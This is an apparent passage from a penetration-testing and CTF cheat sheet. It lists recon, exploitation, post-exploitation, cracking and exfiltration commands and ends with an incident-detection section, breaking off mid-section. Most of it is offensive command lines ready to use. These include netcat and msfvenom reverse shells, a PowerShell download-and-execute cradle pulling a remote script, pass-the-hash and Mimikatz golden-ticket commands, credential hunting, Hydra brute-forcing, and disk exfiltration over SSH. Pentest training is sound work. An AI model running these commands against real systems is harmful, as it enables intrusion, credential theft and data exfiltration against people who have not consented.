[Go to](#exploitation)

*Other things*:

```sh
sslscan <IP>
```

Website cloner:

```sh
wget -r -nH $URL
```

#### Port 88

In case you have a Kerberos instance, you can try to numerate the users with:

```sh
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <IP>
```

There is also the possibility to use Impacket's [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script to find all the users that do not require pre-authentification.

There another tool, [kerbrute](https://github.com/ropnop/kerbrute) with which
you can do basically the same stuff than above and a little more.

#### Port 443 open

* if the server only accepts localhost (you get that through the SSL certificate
  details), you will need to tunnel your connection through a user (needs already a first access to the server)

**Common exploits**:

* [Heartbleed](https://gist.github.com/10174134.git)

#### Port 111, 139, 445 open

Check for Samba, Netbios or NFS shares.

* Netbios

Basic scan:

```sh
nbtscan <IP>
nbtscan -O <FILE> <IP>
# generate an HTTP header
nbtscan -H
# Turns off this inverse name lookup, for hanging resolution
nbtscan -n
# PORT target(s) - This allows specification of a UDP port number to be used as the source in sending a query
nbtscan -p
```

* SMB

Check up smb4k

List services available:

```sh
smbclient -L <IP>\C$
smbmap -H <IP>
```

List permissions:

```sh
smbclient -H <IP>
```

List content:

```sh
smbmap -R -H <IP>
```

Basic connection:

```sh
smbclient //<IP>/<SHARE> -U <USER> -P <PASSWORD>
# Anonymous connection
smbclient //<IP>/<SHARE> -N
```

Get all files from remote:

```sh
smbclient //<IP>/<PATH> -c "prompt OFF; recurse ON; cd '\<PATH>\'; lcd
'<LOCAL_PATH>'; mget *"
```

It is possible to use `enum4linux` for those kind of things (syntax is a bit
easier too):

```sh
enum4linux -U <IP> # enum users
enum4linux -S <IP> # enum shares
```

**Common exploits**:

* Login with no password
* ETERNALBLUE: Spawn a reverse shell and use Helviojunior's [script](https://github.com/helviojunior/MS17-010), `send_and_execute.py`to send payload


* Existing NFS mount

* Mount the file system on your computer:

```sh
nmap -sV --script=nfs-showmount <target>
mkdir temp
mount -o nolock IP:/ $PWD/temp
mount -o rw,vers=2 <target>:<share> <local_directory>
# Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)
mount -t cifs -o username=user,password=pass,domain=<DOMAIN> //<IP>/share-name /mnt/cifs
# Mount a Windows share on Windows from the command line
net use Z: \win-server\share password /user:domain\janedoe /savecred /p:no
# add a user if you can
groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
```

* Some RPC stuff

```sh
nmap -sV -p 111 --script rpcinfo <IP>
```

#### Port 161 (UDP)

```sh
sudo nmap -sU -sV -sC --open -p 161 <IP>
# get something out of that
snmp-check <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>
snmpwalk -v1 -c public <IP>
# Enmerate users from SNMP
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP <IP>
```


#### Existing databases

**MsSQL**:

```sh
sqsh -S <IP> -U <USER> -P <PASSWORD>
# known elevation technique for MsSQL
xp_cmdshell 'whoami';
go
```

**MongoDB**:

```sh
mongo -u <USER> -p <PASSWORD> <HOST:PORT/DB>
# get mongo shell
> db
> show collections
> db.task.find()
> db.task.insert(<EXPLOIT>)
```

**MSQL**:

Load external file into db:

```sql
load data infile '/etc/passwd/'
# load data local infile "../index.php"
into table test
fields terminated by "/n"
```

Disable security in the configuration: `secure-file-priv = ""` and enable local files if necessary: `SET GLOBAL local_infile=1;`


#### Port 5985

If this port is open, it's possible there is an instance of Windows Remove
Management system. You can use
[EvilRM](https://github.com/Hackplayers/evil-winrm) to connect to the target
after you got credentials.

[Go to Post-Exploitation](#post-exploitation)

#### Port 8080

By default, Tomcat can run on port 8080. If this is the case, there are a couple
of exploitation you might look into:

* bruteforce:

You can find this script in the subfolder scripts in this repo.

```sh
ruby tomcat-brute.rb -w tomcat-betterdefaultpasslist.txt -H 10.10.10.95 -P 8080
```

[Hackingarticles.in](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/) has listed a couple of other techniques (some of them are modules in Metasploit):

* Tomcat Manager Authenticated Upload Code Execution
* Tomcat War Deployer Script

If you have access to the manager and can upload a file, you can use this
webshell: [https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp](https://raw.githubusercontent.com/tennc/webshell/master/jsp/jspbrowser/Browser.jsp)

## NSLookup

Basic lookup:

Note: NSLookup is noisy, use another tool in case the lookup of those domain is
sensitive.

```sh
nslookup server <IP>
```

## Host

Basic usage:

```sh
host <IP>
```

Zone transfert:

```sh
host -l <DOMAIN> <IP>
```

## Automation

```sh
enum4linux -a <IP>
```

# Exploitation

## Bruteforcing

Check [hacktricks](https://book.hacktricks.xyz/brute-force) for tips and commands.

## Searchsploit

Basic usage:

```sh
searchsploit <KEYWORDS>
```

Copy path to clipboard:

```sh
searchsploit -p <ID>
```

Copy to current folder:

```sh
searchsploit -m <ID>
```

Get online link instead of local paths:

```sh
searchsploit -w <KEYWORDS>
```

## Shells

### Netcat

Basic bind shell:
```sh
nc -nvlp 443           # On local Kali
nc -nv <REMOTE-IP> 443 # On remote
```

Basic reverse shell:

```sh
sudo nc -nlvp 443                  # On local Kali
nc -nv <LOCAL-IP> 443 -e cmd.exe   # On remote Windows
nc -nv <LOCAL-IP> 443 -e /bin/bash # On remote Linux
```
Sending files:

```sh
sudo nc -nvlp 443 > incoming.exe     # Reciever
nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
```

Scan:

```sh
nc -v -w3 -z IP SPORT-EPORT
```

* `-w3`: no more than 3s per port
* `-z`: minimal data sent

Persistence:

```sh
while [ 1 ]; do echo "ping"; nc -lp PORT -e /bin/sh; done
```

Tip: use `nohup` to create persistence even if the user logs out.

## MSFVenom shells:

### Linux

Linux Meterpreter reverse shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux Meterpreter bind shell x86 multi stage:

```sh
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux bind shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

Linux reverse shell x64 single stage:

```sh
msfvenom -p linux/x64/shell_reverse_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
```

### Windows

Windows Meterpreter http reverse shell:

```sh
msfvenom -p windows/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
```

Windows Meterpreter bind shell:

```sh
msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Multi Stage:

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
```

Windows CMD Single Stage:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

Windows add user:

```sh
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

Windows shell which doesn't break the application for a x86 architecture:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
```


Windows Exec Nishang Powershell in python

```sh
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
```

Bad characters shikata_ga_nai:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "\x04\xA0"
```

Bad characters fnstenv_mov:

```sh
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/fnstenv_mov -b "\x04\xA0"
```

### Misc

Python Shell:

```sh
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
```

Bash Shell:

```sh
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
```

Perl Shell:

```sh
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
```

ASP Meterpreter Shell:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

PHP Reverse Shell:

```sh
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > phpreverseshell.php
```

To get multiple session on a single multi/handler, you need to set the
ExitOnSession option to false and run the exploit -j instead of just the
exploit. For example, for meterpreter/reverse_tcp payload:

```
msf>use exploit/multi/handler
msf>set payload windows/meterpreter/reverse_tcp
msf>set lhost <IP>
msf>set lport <PORT>
msf> set ExitOnSession false
msf>exploit -j
```

## Webshells

* PentestMonkey PHP [webshell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
* Kali's Webshells: `locate webshells`

## cURL

More: https://github.com/curl/curl-cheat-sheet

Upload file:

```sh
curl <IP> --upload-file <FILE>
```

Query as a bot:

```sh
curl -A "'Mozilla/5.0 (compatible;Googlebot/2.1; +http://www.google.com/bot.html)')" <IP>
```

Give parameters with encoding:

```sh
curl <IP> --data-urlencode urlConfig=<PATH>
```

Send request as logged user:

```sh
curl -u <USER> <IP> --data-binary <PAYLOAD>
```

### Common Options ([Source](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58))

`-#, --progress-bar`
        Make curl display a simple progress bar instead of the more informational standard meter.

`-b, --cookie <name=data>`
        Supply cookie with request. If no `=`, then specifies the cookie file to use (see `-c`).

`-c, --cookie-jar <file name>`
        File to save response cookies to.

`-d, --data <data>`
        Send specified data in POST request. Details provided below.

`-f, --fail`
        Fail silently (don't output HTML error form if returned).

`-F, --form <name=content>`
        Submit form data.

`-H, --header <header>`
        Headers to supply with request.

`-i, --include`
        Include HTTP headers in the output.

`-I, --head`
        Fetch headers only.

`-k, --insecure`
        Allow insecure connections to succeed.

`-L, --location`
        Follow redirects.

`-o, --output <file>`
        Write output to <file>. Can use `--create-dirs` in conjunction with this to create any directories
        specified in the `-o` path.

`-O, --remote-name`
        Write output to file named like the remote file (only writes to current directory).

`-s, --silent`
        Silent (quiet) mode. Use with `-S` to force it to show errors.

`-v, --verbose`
        Provide more information (useful for debugging).

`-w, --write-out <format>`
        Make curl display information on stdout after a completed transfer. See man page for more details on
        available variables. Convenient way to force curl to append a newline to output: `-w "\n"` (can add
        to `~/.curlrc`).

`-X, --request`
        The request method to use.


### POST

When sending data via a POST or PUT request, two common formats (specified via the `Content-Type` header) are:

  * `application/json`
  * `application/x-www-form-urlencoded`

Many APIs will accept both formats, so if you're using `curl` at the command line, it can be a bit easier to use the form urlencoded format instead of json because

  * the json format requires a bunch of extra quoting
  * curl will send form urlencoded by default, so for json the `Content-Type` header must be explicitly set

This gist provides examples for using both formats, including how to use sample data files in either format with your `curl` requests.

### curl usage

For sending data with POST and PUT requests, these are common `curl` options:

 * request type
   * `-X POST`
   * `-X PUT`

 * content type header
  * `-H "Content-Type: application/x-www-form-urlencoded"`
  * `-H "Content-Type: application/json"`

* data
  * form urlencoded: `-d "param1=value1&param2=value2"` or `-d @data.txt`
  * json: `-d '{"key1":"value1", "key2":"value2"}'` or `-d @data.json`

### Examples

#### POST application/x-www-form-urlencoded

`application/x-www-form-urlencoded` is the default:

    curl -d "param1=value1&param2=value2" -X POST http://localhost:3000/data

explicit:

    curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://localhost:3000/data

with a data file

    curl -d "@data.txt" -X POST http://localhost:3000/data

#### POST application/json

    curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data

with a data file

    curl -d "@data.json" -X POST http://localhost:3000/data


## Powershell

Download remote files:

```powershell
powershell "(New-Object System.Net.WebClient).DownloadFile("<IP+file>",
<Destination-File>)"
```


# Post-Exploitation

## Metasploit

### Upgrade shell to meterpreter

* Run the exploit directly in background: `exploit -z`
* Use the post exploitation module: `use post/multi/manage/shell_to_meterpreter` (if you set the payload as simple reverse shell. Otherwise, it's meterpreter by default)
* Set the session (find the sessions with `sessions -l`): `set SESSION N`
* Connect to the session: `sessions -i N`

### hashdump

* In a meterpreter session run `run post/windows/gather/hashdump`


## Improve your shell

* `sh -c uname -a; w; id; /bin/bash -i`
* For NMAP versions 2.0 to 5.8:
```sh
nmap --interactive
!sh
```
* `python -c 'import pty; pty.spawn("/bin/bash")'`
* `stty raw -echo` and then `fg` and `export TERM=xterm`

## Local Recon

### Windows

General recon:

```cmd
whoami
hostname
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
ipconfig /all
netstat
wmic csproduct get name
wmic bios get serialnumber
wmic computersystem list brief
doskey /history > history.txt
```

Network discovery:

```cmd
net view /all
net view \\<Hostname>
net users
net users /domain
net localgroup administrators
net group administrators
wmic rdtoggle list
wmic useraccount list
wmic group list
wmic netlogin get name,lastlogon,badpasswordcount
wmic netclient list brief

```

Ping scan:

```cmd
C:\> for \L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find "Reply" >> output.txt
```

Look for passwords:

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
dir /s *pass* == *.config
findstr /si password *.xml *.ini *.txt *.bat *.ps1
# don't forget that this exists
ls -force
```

Specific string search:

```powershell
ls -r C:\PATH -file | {Select-String -path $_ -pattern <SEARCH TERM>}
```

Credentials:

```powershell
# Import credentials from a xml powershell file
$creds = Import-CliXml -Path C:\Users\file.txt
$creds.GetNetworkCredential().Password

# it is also possible to grab the current user's credential with
Get-Credential
# or for a specific user
Get-Credential -credential $user
```

Get-Credential returns an object for which there is a good
[documentation](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-credential?view=powershell-7).
However, it might not run if you are not the user you try to get credential for.


#### Automation

* [WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
* [COMahawk](https://github.com/apt69/COMahawk)

JuicyPotato, HotPotato...


### Linux

General recon:

```sh
whoami
hostname
ifconfig
id
uname -a
cat /etc/passwd
cat /etc/shadow
cat /etc/*-release
sudo -l
ps -aux
netstat -tulpn
watch ss -stulp
lsof -i
# show last logged users
last
df -h
# reset pw in one line
echo "user:pass" | chpasswd
# list users
getent passwd
```

Run a command as a user:

```sh
sudo -u <USER>
sudo -i -u <USER>
```

Network discover:

```sh
ifconfig
ip a
```

Ping scan:

```sh
for i in `seq 1 254`; do ping 192.168.1.$i; done
```

#### General find:

* `-L`: follow symbolic links

File types:

* f: a regular file
* d: directory
* l: symbolic link
* c: character devices
* b: block devices
* p: named pipe (FIFO)
* s: socket

Options:

* -amin n: The file was last accessed n minutes ago.
* -anewer: The file was last accessed more recently than it was modified.
* -atime n: The file was last accessed more n days ago.
* -cmin n: The file was last changed n minutes ago.
* -cnewer: The file was last changed more recently than the file was modified.
* -ctime n: The file was last changed more than n days ago.
* -empty: The file is empty.
* -executable: The file is executable.
* -false: Always false.
* -fstype type: The file is on the specified file system.
* -gid n: The file belongs to group with the ID n.
* -group groupname: The file belongs to the named group.
* -ilname pattern: Search for a symbolic line but ignore the case.
* -iname pattern: Search for a file but ignore the case.
* -inum n: Search for a file with the specified node.
* -ipath path: Search for a path but ignore the case.
* -iregex expression: Search for an expression but ignore the case.
* -links n: Search for a file with the specified number of links.
* -lname name: Search for a symbolic link.
* -mmin n: The file data was last modified n minutes ago.
* -mtime n: The file data was last modified n days ago.
* -name name: Search for a file with the specified name.
* -newer name: Search for a file edited more recently than the file given.
* -nogroup: Search for a file with no group id.
* -nouser: Search for a file with no user attached to it.
* -path path: Search for a path.
* -readable: Find files that are readable.
* -regex pattern: Search for files matching a regular expression.
* -type type: Search for a particular type.
* -uid uid: The file numeric user id is the same as the uid.
* -user name: The file is owned by the user that is specified.
* -writable: Search for files that can be written to.

##### Find (by permissions)

Find SUID/SGID files:

```sh
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
find / -perm /u=s
find / -perm /g=s
find / -perm 2644
find / -perm 1551
find . -type f -perm 0777 -print
find / -type f ! -perm 777
```

Find read only files:

```sh
find / -perm /u=r
find / -perm /a=x
```

Find all 777 permission files and use chmod command to set permissions to 644:

```sh
find / -type f -perm 0777 -print -exec chmod 644 {} \;
```

##### Find (and execute)

For example to delete all files ending with .temp from the /var/log/ you would use:

```sh
find /var/log/ -name `*.temp` -delete
```

Find and remove single File:

```sh
find . -type f -name "tecmint.txt" -exec rm -f {} \;
```

Find and remove Multiple File:

```sh
find . -type f -name "*.txt" -exec rm -f {} \;
find . -type f -name "*.mp3" -exec rm -f {} \;
```

Send output from the find command to a file:

```sh
find / -name *.mp3 -fprint nameoffiletoprintto
```

Find and execute a command against a file:

```sh
# Search and edit a file at the same time
find / -name filename -exec nano '{}' \;
```

##### Find (user based)

Find single files based on user:

```sh
find / -user root -name file.txt
```

Find all files based on group:

```sh
find /home -group developer
```

Find Particular Files of User:

```sh
find /home -user tecmint -iname "*.txt"
```

##### Find (time based)

Find last 50 days modified files:

```sh
find / -mtime 50
```

Find last 50 days accessed files:

```sh
find / -atime 50
```

Find Last 50-100 Days Modified Files:

```sh
find / -mtime +50 –mtime -100
```

Find Changed Files in Last 1 Hour:

```sh
find / -mmin -60
```

Find Accessed Files in Last 1 Hour:

```sh
find / -amin -60
```

##### Find (size based)

* b: 512-byte blocks (default)
* c: bytes
* w: two-byte words
* k: Kilobytes
* M: Megabytes
* G: Gigabytes

Find Size between 50MB – 100MB:

```sh
find / -size +50M -size -100M
```

Find and Delete 100MB Files:

```sh
find / -type f -size +100M -exec rm -f {} \;
```

Find Specific Files and Delete:

```sh
find / -type f -name *.mp3 -size +10M -exec rm {} \;
```

Find all emtpy files:

```sh
find /tmp -type f -empty
```

Find all empty directories:

```sh
find /tmp -type d -empty
```

Find all hidden files:

```sh
find /tmp -type f -name ".*"
```

#### Automation

* [Linux Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2)
* [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* MySQL running as root? [`raptor_udf2.c`](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c)
* [Monitor linux processes without root permissions](https://github.com/DominicBreuker/pspy)

If you are on a modern ubuntu, there is a Privesc vector through the USB creator
program: [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

### Send files to remote hosts

#### Powershell

```powershell
Invoke-Webrequest -Uri <IP> -OutFile <DestFile>

# Win 7
(New-Object System.Net.WebClient).DownloadFile("http://<IP>/nc.exe", "c:\nc.exe")

# Win 8 and later
wget "http://<IP>/nc.exe" -outfile "c:\nc.exe"
```

#### Impacket-smbserver

```sh
impacket-smbserver secure . (-smb2support)
copy \\<IP>\secure\<FILE>
```

## Firewall

```powershell
# Get Firewall rules
Get-NetFirewallRule -all | Out-GridView
Get-NetFirewallRule -all | Export-csv <file.csv>

# Add a Firewall rule
New-NetFirewallRule -Action Allow -DisplayName <NAME> -RemoteAddress <IP>
```

## Pivoting

SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the -D flag as follows.

`ssh $USERNAME@$RHOST -D 1080`

This opens a SOCKS proxy on your machine’s port 1080, which is proxied to the target system. You can configure to use it with proxychains quite easily.

Another nice addition to the proxying portfolio is sshuttle, it does some magic to automatically proxy traffic from your host to a certain subnet through the target system.

`sshuttle -r $USERNAME@$RHOST 10.1.1.0/24`

If you only have Windows systems to deal with, Chisel comes highly recommended. It’s a bit more complicated to set up a full SOCKS proxy, as it requires two sessions on the target. The required commands are as below.

On Kali:

```sh
./chisel server -p 8000 --reverse
```

On target:

```sh
.\chisel_windows_386.exe client $LHOST:8000 R:8001:127.0.0.1:9001
```

Now we are listening on localhost:8001 on kali to forward that traffic to target:9001.

Then, open the Socks server: On target:

```sh
.\chisel_windows_386.exe server -p 9001 --socks5
```

On Kali:

```
./chisel client localhost:8001 socks
```


## Port forwarding

If you find a vulnerable service running on the target host, one way to exploit
it would be to forward the port where this service is running towards your
machine and launch the exploit from there.

### Windows

```cmd
plink.exe -ssh -l <USER> -pw <PASSWORD> -R <BIND_IP>:<BIND_PORT>:127.0.0.1:<PORT> <BIND_IP>
```

### Linux

#### Netcat tunneling

Listeners on attacker and victim machine.

On the relay machine:

```sh
mknod backpipe p
nc 127.0.0.1 444 0<backpipe | nc 127.0.0.1 2222 1>backpie
```

#### SSH tunneling

```sh
# port forward
ssh -N -R <BIND_IP>:<BIND_PORT>:host:hostport <user@address>

# dynamic port forward + add 8888 port to the proxychains conf
ssh -N -D 127.0.0.1:8888 <user@address>
```
### SSH over HTTP (Squid)


* socat
```
socat TCP-L:9999,fork,reuseaddr PROXY:192.168.1.41:127.0.0.1:22,proxyport=3128

ssh john@127.0.0.1 -p 9999
```

* proxytunnel
```
proxytunnel -p 192.168.1.41:3128 -d 127.0.0.1:22 -a 5555

ssh john@127.0.0.1 -p 5555
```

* proxychains
```
http 192.168.1.41 3128

proxychains ssh john@127.0.0.1
```

### TCP over HTTP

Check: https://sensepost.com/discover/tools/reGeorg/

### HTTP Redirectors

* socat

```
socat TCP4-LISTEN:80,fork TCP4:REMOTE-HOST-IP-ADDRESS:80
```

* iptables

```
iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTEADDR:80
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT
sysctl net.ipv4.ip_forward=1
```

### Windows Socks proxy

Check: https://github.com/p3nt4/Invoke-SocksProxy

## Active Directory

### Bypass Applocker

* Rundll32

```powershell
rundll32.exe PowerShdll.dll,main
```

Check: https://github.com/p3nt4/PowerShdll

### Pass the hash

* Invoke a command Remotely

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-WMIExec.ps1')

 Invoke-WMIExec -Target SVHOST2  -Username Administrator -Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell whoami | out-file \\SVHOST2\C$\windows\thing.txt"
```
* Invoke Mimikatz Remotely

```powershell
Invoke-WMIExec -Target SVHOST2  -Username Administrator
-Hash 78560bbcf70110fbfb5add17b5dfd762 -Command "powershell -Enc SQBFA...AoA"
```
*  Pass The Hash with Mimikatz

```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:adm_maint /ntlm:cbe55f143fcb6d4687583af520123b89 /domain:lazuli"'
 ```

### Kerberos

*  Generate Golden Ticket (Domain Admin Required)

```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:LAZULI.CORP /user:krbtgt"'
Invoke-Mimikatz  -Command '"kerberos::golden /user:adon /domain:LAZULI.CORP /krbtgt:ca1c2aeda9160094be9971bdc21c50aa /sid:S-1-5-21-1238634245-2147606590-2801756923 /id:500 /ticket:admin.kirbi /ptt"
Invoke-Mimikatz  -Command '"kerberos::ptt admin.kirbi"'
```

## Cracking

Decompress things:

```sh
tar xf archive.tar
tar xvzf archive.tar.gz
tar xjf archive.tar.bz2
tar xtvf file.tar.gz | grep <WORD>
tar -C <DEST> -xvf <FILE>
unzip archive.zip
gzip -d archive.gz

# read a gz file without decompressing
zcat archive.gz
zless archive.gz
zgrep <WORD> /var/log/mailliog*.gz

# Search instide a zip archive
zipgred *.txt archive.zip
```

Compress things:

```sh
zip -r file.zip /dir/*
tar cf archive.tar files
tar czf archive.tar.gz files
tar cjf archive.tar.bz2 files
gzip file
```

### John

```sh
john --wordlist=dict.txt passwd
john --show passwd
john --restore
unshadow passwd shadow > unshadowed.txt
john --wordlist=dict.txt unshadowed.txt
keepass2john /root/Desktop/NewDatabase.kdb > file
john -incremental:alpha -format=keepass file
```

### Hashcat

Basic use:

```sh
hashcat -m 0 -a 0 -o <OUTPUT_FILE> <INPUT_FILE> <WORDLIST>

# basic bruteforce attack for MD5
hashcat -a 0 -m 0 hashes.txt dict.txt

# basic bruteforce with combinations for MD5 (this will add the combinations of
hashcat -a 1 -m 0 hashes.txt dict.txt
```

* `-m`: defines the algorithm type ([full list](https://hashcat.net/wiki/doku.php?id=example_hashes))
* `-a`: attack mode (0: straight, 1: combination, 3: brute-force)

### Hydra

```sh
hydra -l user -P passlist.txt ftp://192.168.0.1
hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
hydra -C defaults.txt -6 pop3s://[fe80::2c:31ff:fe12:ac11]:143/TLS:DIGEST-MD5
hydra -L users.txt -P pass.txt <IP> -s <PORT> http-post-form "/users/sign_in:user[email]=^USER^&user[password]=^PASS^&user[Commit]=Log inn:Invalid Email or password.
hydra -P /usr/share/wordlistsnmap.lst <IP> smtp -V
```

More cheats from [https://github.com/frizb/Hydra-Cheatsheet](https://github.com/frizb/Hydra-Cheatsheet)

```sh
hydra -L ./webapp.txt -P ./webapp.txt <IP> http-get /admin
hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<IP>
hydra -l admin -P ./passwordlist.txt <IP> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```

### Binwalk

### Steghide

```sh
steghide extract -sf <FILE>
```

### Fcrackzip

Run as dictionnary mode, try to decompress the target:

```sh
fcrackzip -u -D -p <Wordlist> <FILE>
```

### Uncipher stuff

Handy tool for RSA: [RsaCTFTool](https://github.com/Ganapati/RsaCtfTool)

# Exfiltration

Encrypted Exfiltration channel:

*Exfiltrate the contents of an image via SSH to another machine, compressing (-C) the content.*

```sh
dd if=/dev/rdisk0s1s2s bs=65536 conv=noerror,sync | ssh -C user@<IP> "cat >/tmp/image.dd"
```

# Detection

This section cover detection malicious activity on system and could be a good
list of stuff to clean up.

Stages:

* Preparation
* Identification
* Containment
* Eradication
* Recovery
* Lesson Learned

## Linux

### Users

List connected users:

```sh
w
who
```

Linux systems keep a trace of the connections. keeping in memory user, IP and
even length of the connection:

```sh
last
```

List connection errors:

```sh
lastb
```

List the recent history the current user:

```sh
history

su otheruser
history
```

Check if there isn't a new user registered:

```sh
cat /etc/passwd
awk -F':' '{ print $1}' /etc/passwd

# list only user using shells
cat /etc/passwd | grep /bin/bash (ou zsh, sh, etc.)

# list available shells on your machine
cat /etc/shells
```

### Processes

Check processes:

```sh
ps
ps aux
top
lsof -i
lsof -i -p <PID>

# check files open by a process

lsof -l
lsof -p <PID>
```

### Network

Capture traffic on any interface from a target host and specific port and output to an file:

```sh
tcpdump -w <FILENAME>.pcap -i any dst <TARGET IP> and port 80
```

Save pcap file on rotating size:

```sh
tcpdump -n -s65353 -C 1000 -w '%host_%Y-%m-%d_%H:%M:%S.pcap'
```

Save pcap to a remote host:

```sh
tcpdump -w - | ssh <REMOTE IP> -p 50005 "cat - > /tmp/remotecapture.pcap"
```

List all current iptables rules:

```sh
iptables -L
```

Flush rules:

```sh
iptables -F
```

Export existing iptables firewall rules:

```sh
iptables-save > firewall.out
```

Restore firewall rules:

```sh
iptables-restore < firewall.out
```

Block all connections:

```sh
iptables-policy INPUT DROP
iptables-policy OUTPUT DROP
iptables-policy FORWARD DROP
```

Check ports:

```sh
# list TCP/UDP open ports

netstat -lntup
ss -lntup

# use routes

netstat -r

# show routes stats

netstat -s
ss -s
```

Check network and routes:

```sh
ip address
ip a
ip route
```

Check running crons:

```sh
crontab -l
crontab -u user -l
ls -la /etc/cron.daily
ls -la /etc/cron.hourly
ls -la /etc/cron.weekly
```

Quick search modified files (check the [General Find](https://github.com/christalib/yaCTFpl/blob/aleph/manual.md#general-find) section for more detail):

Find files modified in the past 5 days:

```sh
find / -mtime -5 -ctime -5
```

Find files modified in the last minute:

```sh
find / -mmin -1
```

General logs:

```sh
cat /var/log/syslog
cat /var/log/syslog | less
tail -f -n 5 /var/log/syslog
cat /var/log/syslog | grep fail
tail -f /var/log/syslog
```

Check SSH keys:

```sh
cat /root/.ssh/authorized_keys
cat /home/debian/.ssh/authorized_keys
cat /home/user1/.ssh/authorized_keys
```

Check /tmp content:

```sh
ls /tmp
ls -la /tmp
ls -la /tmp | more
less /tmp
ls -la /tmp | grep xxx
```

## Windows

### Users:

```cmd
psloggedon \\<COMPUTER NAME>

for /L %i in (1,1,254) do psloggedon \\192.168.1.%i >> C:\users_output.txt
```

```cmd
net users
net localgroup users
net localgroup administrators
net user NAME | findstr /B /C:"Last logon"
```

```cmd
net view \\127.0.0.1 # shares
net session # sessions
net use # open sessions
nbstat -s # netbios TCP/IP activity
nbstat -na # unusual TCP/UDP port listening
```

### Tasks:

```cmd
tasklist /v
wmic process list full
wmic startup list full
wmic process get name,parentprocessid,processid
tasklist /m /fi "pid eq PID"
wmic process where processid=PID get commandline
```
Check scheduled tasks: https://blog.malwarebytes.com/cybercrime/2015/03/scheduled-tasks/

### Services:

```cmd
services.msc
net start
sc query | more
tasklist /svc
```

Check services listening to ports:

```cmd
netstat -nao | findstr /B /C "ESTABLISHED"
tasklist /fi "pid eq PID"
tasklist /fi "pid eq PID" /m # get list of modules
```

Check past connections: File explorer > search for "hosts".

### Keys

```powershell
